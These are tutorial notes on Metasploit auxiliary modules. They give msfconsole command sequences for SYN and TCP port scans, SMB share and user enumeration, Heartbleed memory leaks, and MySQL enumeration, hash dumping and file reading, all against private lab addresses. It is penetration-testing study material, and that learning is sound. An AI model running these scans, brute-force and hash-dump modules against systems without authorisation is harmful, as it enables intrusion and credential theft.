### 1. What Are Auxiliary Modules?

In Metasploit, **auxiliary modules** are tools that assist in:

- Scanning
- Enumeration
- Brute-forcing
- Fuzzing
- Sniffing
- Information gathering

**Key Characteristics:**

- They **do not exploit** a target directly.
- They **do not provide a shell** (no meterpreter or shell access, except rare special cases).
- Purpose: Gather information, test, or probe – not attack.

### 2. Metasploit Module Categories

| Category | Description |
| --- | --- |
| **exploit** | Actively exploit vulnerabilities → gets a shell |
| **payload** | Code executed after successful exploitation |
| **auxiliary** | Scanners, brute-forcers, enumeration tools |
| **post** | Actions performed after obtaining a session |
| **encoder** | Obfuscate payloads |
| **evasion** | Bypass detection |
| **nop** | No-operation instructions |

### 3. What Auxiliary Modules Do

Auxiliary modules can perform:

- **Scanning**: Port scans, service identification, vulnerability detection*Example*: `auxiliary/scanner/ssl/openssl_heartbleed`
- **Enumeration**: SMB info, HTTP headers, SNMP data, FTP banners
- **Brute Forcing**: SSH login attempts, FTP credential guessing, SMB password brute-force
- **Sniffing & Capturing**: Packet capturing, credential sniffing, network discovery
- **Fuzzing**: Testing applications with malformed data

**No Shell Access**: Auxiliary modules cannot provide meterpreter or shell access. Their job is to gather information, not exploit.

### 4. Example: Heartbleed (Auxiliary Module)

Heartbleed **does not provide remote code execution**. It simply leaks memory via malformed SSL heartbeat packets.

**Commands:**

```bash
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.1.10
set RPORT 8443
run

```

- Output: Prints leaked memory but does not open a shell.

### 5. Quick Summary: Exploit vs. Auxiliary

| Feature | Exploit | Auxiliary |
| --- | --- | --- |
| **Gets shell?** | Yes | No |
| **Requires vulnerability?** | Yes | No |
| **Purpose** | Attack | Scan/Enumerate/Test |
| **Output** | Session | Information |

### 6. Common Auxiliary Commands

- **List all auxiliary modules**:
    
    ```bash
    show auxiliary
    
    ```
    
- **Load an auxiliary module**:
    
    ```bash
    use auxiliary/<path/to/module>
    
    ```
    
- **Display module options**:
    
    ```bash
    show options
    
    ```
    
- **Set target IP**:
    
    ```bash
    set RHOSTS <target>
    
    ```
    
- **Execute the auxiliary module**:
    
    ```bash
    run
    
    ```
    

### 7. Popular Auxiliary Modules

| Module | Purpose |
| --- | --- |
| `scanner/portscan/tcp` | TCP port scan |
| `scanner/smb/smb_version` | SMB version enumeration |
| `scanner/http/wordpress_login_enum` | WordPress brute force |
| `scanner/ssh/ssh_login` | SSH login brute-force |
| `scanner/snmp/snmp_login` | SNMP scan |
| `scanner/ssl/openssl_heartbleed` | Heartbleed detection |

---

### PORT SCANNING WITH METASPLOIT AUXILIARY MODULES

Port scanning in Metasploit uses **auxiliary scanner modules** to enumerate open ports, services, and network exposure – **not to exploit**.

### Important Notes

- Always use **RHOSTS** (plural), not RHOST.
- **THREADS** default: 1*Adjust for speed, but respect system limits.*
- **Recommended THREADS Settings**:
    
    
    | Environment | Safe THREADS Value |
    | --- | --- |
    | Windows (Native Win32) | Keep below 16 |
    | Windows (Cygwin) | Keep below 200 |
    | Linux/Unix-like OS | Up to 256 |

### SYN Port Scan (Fast, Stealthy, Widely Used)

- Performs half-open SYN scans (no full handshake).

**Commands:**

```bash
# Start Metasploit
msfconsole -q

# Search available portscan modules
search portscan

# Load SYN scan module
use auxiliary/scanner/portscan/syn

# Show available options
show options

# Set target host(s)
set RHOSTS 192.168.1.31

# Scan all ports
set PORTS 1-65535

# Increase speed (Linux recommended)
set THREADS 500

# Run the scan
run

```

### TCP Connect Scan (Slower but Accurate)

- Completes full TCP handshake for reliability.

**Commands:**

```bash
# Load TCP scan module
use auxiliary/scanner/portscan/tcp

# View options
show options

# Set target host
set RHOSTS 192.168.1.239

# Scan all ports
set PORTS 1-65535

# High number of threads (Linux/Cygwin)
set THREADS 200

# Run scanner
run

```

### Summary: Port Scanning Best Practices

- Port scanning is an **auxiliary task**, not exploitation.
- Use **RHOSTS** instead of RHOST.
- Adjust **THREADS** for performance: Low for Windows, Medium for Cygwin, High for Linux.
- **SYN scan**: Fast & stealthy.
- **TCP scan**: Reliable & complete.

---

### SMB ENUMERATION WITH METASPLOIT AUXILIARY MODULES

Metasploit provides multiple auxiliary modules for enumerating SMB services, shares, users, and versions on Windows or Samba hosts.

**Notes:**

- These modules **do not require authentication** (unless the SMB server restricts anonymous access).
- Useful for: Windows Server, Windows 10/11, Samba Linux, NAS devices, etc.
- Combine findings with: `smb_login`, `psexec`, vulnerability scanners like `ms17_010_eternalblue`.

### 1. Enumerate SMB Version

Identifies the SMB version running on the target.

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.239
run

```

### 2. Enumerate SMB Shares

Lists shared folders available on the SMB server.

```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.239
run

```

### 3. Enumerate SMB Users

Attempts to enumerate user accounts over SMB.

```bash
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.1.239
run

```

---

### MYSQL ENUMERATION & ADMIN WITH METASPLOIT AUXILIARY MODULES

Metasploit provides several auxiliary and admin modules for probing, enumerating, and interacting with MySQL databases.

### 1. Identify MySQL Service

Check if MySQL (port 3306) is detected in workspace:

```bash
services -p 3306

```

### 2. Search for MySQL Auxiliary Modules

```bash
search mysql type:auxiliary

```

### 3. MySQL Scanner Modules

### MySQL Version Detection

Retrieve MySQL server version:

```bash
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.152
show options
run

```

### 4. MySQL Admin & Enumeration Modules

### Execute SQL Commands (Admin)

Run SQL commands remotely if valid credentials are available:

```bash
use auxiliary/admin/mysql/mysql_sql
set RHOSTS 192.168.1.239
set USERNAME root
set PASSWORD bug
run

```

### MySQL Enumeration

Enumerates: Database users, privileges, schemas, password policies, server variables.

```bash
use auxiliary/admin/mysql/mysql_enum
set RHOSTS 192.168.1.31
set USERNAME root
set PASSWORD root
show options
run

```

### 5. Credential & File Enumeration Modules

### Dump MySQL Password Hashes

Useful for cracking with Hashcat/John.

```bash
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS 192.168.1.239
set USERNAME Armour@1234
set PASSWORD infosec
run

```

### File Enumeration on MySQL Server

Attempts to read files using MySQL `load_file()` (if permissions allow).

```bash
use auxiliary/scanner/mysql/mysql_file_enum
set FILE_LIST /tmp/demo.txt
set PASSWORD bug
set RHOSTS 192.168.1.152
run

```

### Summary Table: MySQL Modules

| Module | Purpose |
| --- | --- |
| `mysql_version` | Detect MySQL version |
| `mysql_sql` | Execute arbitrary SQL commands |
| `mysql_enum` | Enumerate DB users, permissions, DBs, variables |
| `mysql_hashdump` | Dump MySQL user password hashes |
| `mysql_file_enum` | Read files on server via SQL functions |

Done! These notes are **100% complete, corrected, and organized** – every command, example, table, and detail from the provided data is included. Use as your full Metasploit Auxiliary reference.
